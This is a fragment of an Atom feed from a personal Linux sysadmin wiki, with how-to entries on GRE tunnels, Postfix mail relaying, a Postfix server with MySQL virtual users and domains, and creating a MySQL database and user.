&lt;/pre&gt;&lt;/div&gt;</content><category term="linux"></category><category term="ipip"></category><category term="tunnel"></category></entry><entry><title>GRE Tunnel</title><link href="http://wiki.jokeru.ro/how-to-gre-tunnel.html" rel="alternate"></link><published>2011-01-18T23:50:00+00:00</published><updated>2011-01-18T23:50:00+00:00</updated><author><name>jokeru</name></author><id>tag:wiki.jokeru.ro,2011-01-18:/how-to-gre-tunnel.html</id><summary type="html">&lt;p&gt;GRE tunnels can incapsulate IPv4/IPv6 unicast/multicast traffic, so it
is de-facto tunnel standard for dynamic routed networks. You can setup
up to 64K tunnels for an unique tunnel endpoints pair. It can work with
FreeBSD and cisco IOS. Kernel module is 'ip_gre'.&lt;/p&gt;
&lt;p&gt;The following setup will configure a …&lt;/p&gt;</summary><content type="html">&lt;p&gt;GRE tunnels can incapsulate IPv4/IPv6 unicast/multicast traffic, so it
is de-facto tunnel standard for dynamic routed networks. You can setup
up to 64K tunnels for an unique tunnel endpoints pair. It can work with
FreeBSD and cisco IOS. Kernel module is 'ip_gre'.&lt;/p&gt;
&lt;p&gt;The following setup will configure a GRE tunnel between Node 1 (having
10.20.30.40 as public IP) and Node 2 (having 50.60.70.80 as public IP).
The GRE tunnel subnet used will be 192.168.1.0/30 since we only need 2
IPs. We'll also route 2 other subnets from Node 1 to Node 2 and from
Node 2 to Node 1 using the newly created GRE interfaces.&lt;/p&gt;
&lt;h3&gt;Node 1&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; modprobe ip_gre
&lt;span class="gp"&gt;$&lt;/span&gt; ip tunnel add gre1 mode gre &lt;span class="nb"&gt;local&lt;/span&gt; &lt;span class="m"&gt;10&lt;/span&gt;.20.30.40 remote &lt;span class="m"&gt;50&lt;/span&gt;.60.70.80
&lt;span class="gp"&gt;$&lt;/span&gt; ip address add dev gre1 &lt;span class="m"&gt;192&lt;/span&gt;.168.1.1 peer &lt;span class="m"&gt;192&lt;/span&gt;.168.1.2/30
&lt;span class="gp"&gt;$&lt;/span&gt; ip link &lt;span class="nb"&gt;set&lt;/span&gt; dev gre1 up
&lt;span class="gp"&gt;$&lt;/span&gt; ip route add &lt;span class="m"&gt;172&lt;/span&gt;.16.10.0/24 via &lt;span class="m"&gt;192&lt;/span&gt;.168.1.2

&lt;span class="gp"&gt;$&lt;/span&gt; ip link show gre1
&lt;span class="gp"&gt;$&lt;/span&gt; ifconfig gre1
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Node 2&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; modprobe ip_gre
&lt;span class="gp"&gt;$&lt;/span&gt; ip tunnel add gre1 mode gre &lt;span class="nb"&gt;local&lt;/span&gt; &lt;span class="m"&gt;50&lt;/span&gt;.60.70.80 remote &lt;span class="m"&gt;10&lt;/span&gt;.20.30.40
&lt;span class="gp"&gt;$&lt;/span&gt; ip address add dev gre1 &lt;span class="m"&gt;192&lt;/span&gt;.168.1.2 peer &lt;span class="m"&gt;192&lt;/span&gt;.168.1.1/30
&lt;span class="gp"&gt;$&lt;/span&gt; ip link &lt;span class="nb"&gt;set&lt;/span&gt; dev gre1 up
&lt;span class="gp"&gt;$&lt;/span&gt; ip route add &lt;span class="m"&gt;172&lt;/span&gt;.16.20.0/24 via &lt;span class="m"&gt;192&lt;/span&gt;.168.1.1

&lt;span class="gp"&gt;$&lt;/span&gt; ip link show gre1
&lt;span class="gp"&gt;$&lt;/span&gt; ifconfig gre1

&lt;span class="gp"&gt;$&lt;/span&gt; ping &lt;span class="m"&gt;192&lt;/span&gt;.168.1.1
&lt;span class="go"&gt;PING 192.168.1.1 (192.168.1.1) 56(84) bytes of data.&lt;/span&gt;
&lt;span class="go"&gt;64 bytes from 192.168.1.1: icmp_seq=1 ttl=64 time=201 ms&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Cleanup&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ip tunnel del gre1
&lt;span class="gp"&gt;$&lt;/span&gt; rmmod ip_gre
&lt;/pre&gt;&lt;/div&gt;


&lt;blockquote&gt;
&lt;p&gt;Ubuntu Networking: &lt;a href="http://onvox.net/linux/how-to-create-ipv4-gre-tunnels-in-ubuntu"&gt;http://onvox.net/linux/how-to-create-ipv4-gre-tunnels-in-ubuntu&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;</content><category term="linux"></category><category term="ubuntu"></category><category term="gre"></category><category term="tunnel"></category></entry><entry><title>Relay mails from Server 1 through Server 2</title><link href="http://wiki.jokeru.ro/how-to-relay-mails-from-server-1-through-server-2.html" rel="alternate"></link><published>2011-01-18T00:25:00+00:00</published><updated>2011-01-18T00:25:00+00:00</updated><author><name>jokeru</name></author><id>tag:wiki.jokeru.ro,2011-01-18:/how-to-relay-mails-from-server-1-through-server-2.html</id><summary type="html">&lt;h3&gt;Server 1 (Postfix) - 10.20.30.40&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; vi /etc/postfix/main.cf &lt;span class="c1"&gt;# add: relayhost = 50.60.70.80&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; service postfix reload
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Server 2 (Postfix) - 50.60.70.80&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; vi /etc/postfix/main.cf &lt;span class="c1"&gt;# update: mynetworks = 127.0.0.1/8, 10.20.30.40/32&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; service postfix reload
&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;h3&gt;Server 1 (Postfix) - 10.20.30.40&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; vi /etc/postfix/main.cf &lt;span class="c1"&gt;# add: relayhost = 50.60.70.80&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; service postfix reload
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Server 2 (Postfix) - 50.60.70.80&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; vi /etc/postfix/main.cf &lt;span class="c1"&gt;# update: mynetworks = 127.0.0.1/8, 10.20.30.40/32&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; service postfix reload
&lt;/pre&gt;&lt;/div&gt;</content><category term="linux"></category><category term="mail"></category><category term="postfix"></category><category term="relay"></category></entry><entry><title>Mail Server - Postfix with Virtual Domains &amp; Users (MySQL)</title><link href="http://wiki.jokeru.ro/how-to-mail-server-postfix-with-virtual-domains-users-mysql.html" rel="alternate"></link><published>2011-01-11T22:22:00+00:00</published><updated>2011-01-11T22:22:00+00:00</updated><author><name>jokeru</name></author><id>tag:wiki.jokeru.ro,2011-01-11:/how-to-mail-server-postfix-with-virtual-domains-users-mysql.html</id><summary type="html">&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; apt-get install postfix postfix-mysql mailutils
&lt;span class="gp"&gt;#&lt;/span&gt; @ Postfix Configuration - No configuration

&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;mail.jokeru.ro&amp;#39;&lt;/span&gt; &amp;gt; /etc/mailname

&lt;span class="gp"&gt;$&lt;/span&gt; vi /etc/postfix/main.cf

&lt;span class="gp"&gt;$&lt;/span&gt; vi /etc/aliases
&lt;span class="gp"&gt;$&lt;/span&gt; newaliases

&lt;span class="gp"&gt;$&lt;/span&gt; vi /etc/postfix/mysql-virtual_domains.cf
&lt;span class="gp"&gt;$&lt;/span&gt; vi /etc/postfix/mysql-virtual_mailboxes.cf
&lt;span class="gp"&gt;$&lt;/span&gt; vi /etc/postfix/mysql-virtual_forwardings.cf
&lt;span class="gp"&gt;$&lt;/span&gt; vi /etc/postfix/mysql-virtual_email2email.cf
&lt;span class="gp"&gt;$&lt;/span&gt; chmod &lt;span class="nv"&gt;o&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; /etc/postfix/mysql-virtual_*.cf …&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; apt-get install postfix postfix-mysql mailutils
&lt;span class="gp"&gt;#&lt;/span&gt; @ Postfix Configuration - No configuration

&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;mail.jokeru.ro&amp;#39;&lt;/span&gt; &amp;gt; /etc/mailname

&lt;span class="gp"&gt;$&lt;/span&gt; vi /etc/postfix/main.cf

&lt;span class="gp"&gt;$&lt;/span&gt; vi /etc/aliases
&lt;span class="gp"&gt;$&lt;/span&gt; newaliases

&lt;span class="gp"&gt;$&lt;/span&gt; vi /etc/postfix/mysql-virtual_domains.cf
&lt;span class="gp"&gt;$&lt;/span&gt; vi /etc/postfix/mysql-virtual_mailboxes.cf
&lt;span class="gp"&gt;$&lt;/span&gt; vi /etc/postfix/mysql-virtual_forwardings.cf
&lt;span class="gp"&gt;$&lt;/span&gt; vi /etc/postfix/mysql-virtual_email2email.cf
&lt;span class="gp"&gt;$&lt;/span&gt; chmod &lt;span class="nv"&gt;o&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; /etc/postfix/mysql-virtual_*.cf
&lt;span class="gp"&gt;$&lt;/span&gt; chgrp postfix /etc/postfix/mysql-virtual_*.cf

&lt;span class="gp"&gt;$&lt;/span&gt; mysql -uroot -p
&lt;span class="go"&gt;mysql&amp;gt; CREATE DATABASE mail;&lt;/span&gt;
&lt;span class="go"&gt;mysql&amp;gt; GRANT SELECT ON mail.* TO &amp;#39;mail&amp;#39;@&amp;#39;localhost&amp;#39; IDENTIFIED BY &amp;#39;p1nky&amp;#39;;&lt;/span&gt;
&lt;span class="go"&gt;mysql&amp;gt; USE mail;&lt;/span&gt;
&lt;span class="go"&gt;mysql&amp;gt; CREATE TABLE domains (domain varchar(50) NOT NULL, PRIMARY KEY (domain)) TYPE=MyISAM;&lt;/span&gt;
&lt;span class="go"&gt;mysql&amp;gt; CREATE TABLE forwardings (source varchar(80) NOT NULL, destination TEXT NOT NULL, PRIMARY KEY (source)) TYPE=MyISAM;&lt;/span&gt;
&lt;span class="go"&gt;mysql&amp;gt; CREATE TABLE users (email varchar(80) NOT NULL, password varchar(20) NOT NULL, PRIMARY KEY (email)) TYPE=MyISAM;&lt;/span&gt;
&lt;span class="go"&gt;mysql&amp;gt; INSERT INTO mail.domains (`domain`) VALUES (&amp;#39;jokeru.ro&amp;#39;);&lt;/span&gt;
&lt;span class="go"&gt;mysql&amp;gt; INSERT INTO mail.users (`email` ,`password`) VALUES (&amp;#39;wiki@jokeru.ro&amp;#39;, ENCRYPT(&amp;#39;w1k1&amp;#39;));&lt;/span&gt;

&lt;span class="gp"&gt;$&lt;/span&gt; groupadd -g &lt;span class="m"&gt;5000&lt;/span&gt; vmail
&lt;span class="gp"&gt;$&lt;/span&gt; useradd -g vmail -u &lt;span class="m"&gt;5000&lt;/span&gt; vmail -d /home/vmail -m

&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nb"&gt;cd&lt;/span&gt; /etc/postfix/
&lt;span class="gp"&gt;$&lt;/span&gt; openssl req -new -outform PEM -out smtpd.cert -newkey rsa:2048 -nodes -keyout smtpd.key -keyform PEM -days &lt;span class="m"&gt;3650&lt;/span&gt; -x509
&lt;span class="gp"&gt;$&lt;/span&gt; chmod &lt;span class="nv"&gt;o&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; smtpd.key

&lt;span class="gp"&gt;$&lt;/span&gt; service postfix restart
&lt;span class="gp"&gt;$&lt;/span&gt; netstat -tulnp &lt;span class="p"&gt;|&lt;/span&gt; grep :25
&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;hello world&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; mail -s &lt;span class="s2"&gt;&amp;quot;welcome&amp;quot;&lt;/span&gt; root
&lt;span class="gp"&gt;$&lt;/span&gt; tail /var/log/mail.log

&lt;span class="gp"&gt;$&lt;/span&gt; vi /etc/bind/zone.jokeru.ro
&lt;span class="gp"&gt;$&lt;/span&gt; service bind9 reload
&lt;span class="gp"&gt;$&lt;/span&gt; dig mx jokeru.ro +short
&lt;span class="gp"&gt;$&lt;/span&gt; dig mail.jokeru.ro +short
&lt;span class="gp"&gt;$&lt;/span&gt; dig txt jokeru.ro +short
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;/etc/postfix/main.cf&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;# See /usr/share/postfix/main.cf.dist for a commented, more complete version

smtpd_banner = $myhostname ESMTP $mail_name - by JoKeru
#always_bcc = wiki@jokeru.ro

# mail server name
myhostname = mail.jokeru.ro
# allow sending emails only from localhost without auth
mynetworks = 127.0.0.0/8
# the domain appended to email from this machine
myorigin = mail.jokeru.ro
# local domains
mydestination = mail.jokeru.ro, localhost, localhost.jokeru.ro
# bind process to interface
inet_interfaces = 10.20.30.40

# various settings
append_dot_mydomain = no
recipient_delimiter = +
message_size_limit = 26214400

# local aliasing
alias_maps = hash:/etc/aliases
alias_database = hash:/etc/aliases

# virtual domains list
virtual_mailbox_domains = proxy:mysql:/etc/postfix/mysql-virtual_domains.cf
# location of the virtual mailbox folders
virtual_mailbox_base = /home/vmail
# the mailbox location for each virtual user
virtual_mailbox_maps = proxy:mysql:/etc/postfix/mysql-virtual_mailboxes.cf
# 50 x 1024 x 1024 Bytes = 50 MB virtual mailbox limit
virtual_mailbox_limit = 52428800
# user and group for virtual mailbox folders
virtual_minimum_uid = 100
virtual_uid_maps = static:5000
virtual_gid_maps = static:5000
# virtual aliasing
virtual_alias_maps = proxy:mysql:/etc/postfix/mysql-virtualforwardings.cf,mysql:/etc/postfix/mysql-virtual_email2email.cf

# TLS (Transport Layer Security) will setup a SSL encrypted connection
# between the server and other servers or email clients so that the
# emails transmitted are secured from eavesdroppers.
smtpd_tls_security_level = may
smtpd_tls_auth_only = yes
smtpd_tls_key_file = /etc/postfix/smtpd.key
smtpd_tls_cert_file = /etc/postfix/smtpd.cert
smtpd_tls_loglevel = 1
#smtpd_tls_received_header = yes

proxy_read_maps = $local_recipient_maps $mydestination $virtual_alias_maps $virtual_alias_domains $virtual_mailbox_maps $virtual_mailbox_domains $relay_recipient_maps $relay_domains $canonical_maps $sender_canonical_maps $recipient_canonical_maps $relocated_maps $mynetworks

# restrictions / spam check
smtpd_helo_required = yes
disable_vrfy_command = yes
smtpd_delay_reject = yes
delay_warning_time = 1h
# Requirements for the HELO statement
smtpd_helo_restrictions =
 permit_mynetworks,
 permit_sasl_authenticated,
 permit
# Requirements for the Connecting Server
smtpd_client_restrictions =
 reject_rbl_client sbl.spamhaus.org,
 reject_rbl_client blackholes.easynet.nl,
 reject_rbl_client dnsbl.njabl.org
# Requirements for the Sender details  
smtpd_sender_restrictions =
 permit_mynetworks,
 permit_sasl_authenticated,
 warn_if_reject reject_non_fqdn_sender,
 reject_unknown_sender_domain,
 reject_unauth_pipelining,
 permit
# Requirement for the Recipient address
smtpd_recipient_restrictions =
 reject_unauth_pipelining,
 permit_mynetworks,
 permit_sasl_authenticated,
 reject_non_fqdn_recipient,
 reject_unknown_recipient_domain,
 reject_unauth_destination,
 permit
# Requirement for the Data content
smtpd_data_restrictions =
 reject_unauth_pipelining
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;/etc/aliases&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;webmaster&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;root&lt;/span&gt;
&lt;span class="n"&gt;hostmaster&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;root&lt;/span&gt;
&lt;span class="n"&gt;postmaster&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;root&lt;/span&gt;
&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;wiki&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;jokeru&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;ro&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;/etc/postfix/mysql-virtual_domains.cf&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;user = mail
password = p1nky
dbname = mail
query = SELECT domain AS virtual FROM domains WHERE domain=&amp;#39;%s&amp;#39;
hosts = 127.0.0.1
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;/etc/postfix/mysql-virtual_email2email.cf&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;user = mail&lt;/span&gt;
&lt;span class="go"&gt;password = p1nky&lt;/span&gt;
&lt;span class="go"&gt;dbname = mail&lt;/span&gt;
&lt;span class="go"&gt;query = SELECT email FROM users WHERE email=&amp;#39;%s&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt;hosts = 127.0.0.1&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;/etc/postfix/mysql-virtual_forwardings.cf&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;user = mail
password = p1nky
dbname = mail
query = SELECT destination FROM forwardings WHERE source=&amp;#39;%s&amp;#39;
hosts = 127.0.0.1
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;/etc/postfix/mysql-virtual_mailboxes.cf&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;user = mail
password = p1nky
dbname = mail
query = SELECT CONCAT(SUBSTRING_INDEX(email,&amp;#39;@&amp;#39;,-1),&amp;#39;/&amp;#39;,SUBSTRING_INDEX(email,&amp;#39;@&amp;#39;,1),&amp;#39;/&amp;#39;) FROM users WHERE email=&amp;#39;%s&amp;#39;  
hosts = 127.0.0.1
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;/etc/bind/zone.jokeru.ro&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;.....  
@ IN MX 10 mail

mail IN A 10.20.30.40

; Sender Policy Framework - SPF  
@ IN TXT &amp;quot;v=spf1 a mx ip4:10.20.30.40/32 -all&amp;quot;
&lt;/pre&gt;&lt;/div&gt;


&lt;blockquote&gt;
&lt;p&gt;source: &lt;a href="http://www.howtoforge.com/virtual-users-domains-postfix-courier-mysql-squirrelmail-ubuntu-10.04"&gt;http://www.howtoforge.com/virtual-users-domains-postfix-courier-mysql-squirrelmail-ubuntu-10.04&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;</content><category term="linux"></category><category term="ubuntu"></category><category term="mail"></category><category term="postgix"></category><category term="mysql"></category></entry><entry><title>MySQL create new DB and User</title><link href="http://wiki.jokeru.ro/how-to-mysql-create-new-db-and-user.html" rel="alternate"></link><published>2011-01-06T21:50:00+00:00</published><updated>2011-01-06T21:50:00+00:00</updated><author><name>jokeru</name></author><id>tag:wiki.jokeru.ro,2011-01-06:/how-to-mysql-create-new-db-and-user.html</id><summary type="html">&lt;h3&gt;Setup&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;mysql&amp;gt; CREATE DATABASE pinky;&lt;/span&gt;
&lt;span class="go"&gt;Query OK, 1 row affected (0.00 sec)&lt;/span&gt;

&lt;span class="go"&gt;mysql&amp;gt; CREATE USER &amp;#39;pinky_user&amp;#39;@&amp;#39;localhost&amp;#39; IDENTIFIED BY &amp;#39;p1nk1&amp;#39;;&lt;/span&gt;
&lt;span class="go"&gt;Query OK, 0 rows affected (0.00 sec)&lt;/span&gt;

&lt;span class="go"&gt;mysql&amp;gt; GRANT ALL PRIVILEGES ON pinky.* TO &amp;#39;pinky_user&amp;#39;@&amp;#39;localhost&amp;#39;;&lt;/span&gt;
&lt;span class="go"&gt;Query OK, 0 rows affected (0.00 sec)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Cleanup&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;mysql&amp;gt; DROP USER …&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;h3&gt;Setup&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;mysql&amp;gt; CREATE DATABASE pinky;&lt;/span&gt;
&lt;span class="go"&gt;Query OK, 1 row affected (0.00 sec)&lt;/span&gt;

&lt;span class="go"&gt;mysql&amp;gt; CREATE USER &amp;#39;pinky_user&amp;#39;@&amp;#39;localhost&amp;#39; IDENTIFIED BY &amp;#39;p1nk1&amp;#39;;&lt;/span&gt;
&lt;span class="go"&gt;Query OK, 0 rows affected (0.00 sec)&lt;/span&gt;

&lt;span class="go"&gt;mysql&amp;gt; GRANT ALL PRIVILEGES ON pinky.* TO &amp;#39;pinky_user&amp;#39;@&amp;#39;localhost&amp;#39;;&lt;/span&gt;
&lt;span class="go"&gt;Query OK, 0 rows affected (0.00 sec)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Cleanup&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;mysql&amp;gt; DROP USER &amp;#39;pinky_user&amp;#39;@&amp;#39;localhost&amp;#39;;&lt;/span&gt;
&lt;span class="go"&gt;Query OK, 0 rows affected (0.00 sec)&lt;/span&gt;

&lt;span class="go"&gt;mysql&amp;gt; DROP DATABASE pinky;&lt;/span&gt;
&lt;span class="go"&gt;Query OK, 0 rows affected (0.00 sec)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;</content><category term="linux"></category><category term="dba"></category><category term="db"></category><category term="mysql"></category></entry></feed>